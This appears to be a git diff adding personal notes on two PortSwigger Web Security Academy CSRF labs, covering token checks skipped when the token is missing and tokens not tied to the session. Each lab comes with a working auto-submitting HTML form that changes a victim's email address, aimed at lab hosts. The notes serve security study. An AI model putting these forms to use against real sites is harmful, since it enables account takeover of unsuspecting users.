@@ -120,4 +120,59 @@ document.forms[0].submit();
 </script>
 ```
 
+### LAB 3
 
+CSRF where token validation depends on token being present 
+
+checks for correct token if the token is present.
+
+if the token Is not sent with the request it will ignore the token checking process.
+
+
+***Payload***
+```
+<form action="https://0aa000790341f70081e948e0008b0004.web-security-academy.net/my-account/change-email"
+      method="POST">
+    <input type="hidden"
+           name="email"
+           value="ironman345@gmail.com">
+  
+ 
+
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+```
+
+### LAB 4
+
+CSRF where token is not tied to user session 
+
+if the attacker have one users csrf token then he can use the same for the other user. the server will not validate weather that csrf is related to the present session or not instead it will check the format and passes the request.
+
+take csrf token from user 1 and use it to send the request from user 2.
+
+here user 1 - wiener | user 2 - montoya 
+
+the below request is sent to ```montoya``` user's session but the csrf token given in the request is ```wiener```.
+
+```
+<form action="https://0aa1004503cd7e9881be25f600d700a1.web-security-academy.net/my-account/change-email"
+      method="POST">
+    <input type="hidden"
+           name="email"
+           value="ogubn@gmail.com">
+<input type="hidden"
+           name="csrf"
+           value="0jv9NNBnE8wm7fQXkrWTSq1ngzIS5xgt">
+  
+ 
+
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+```
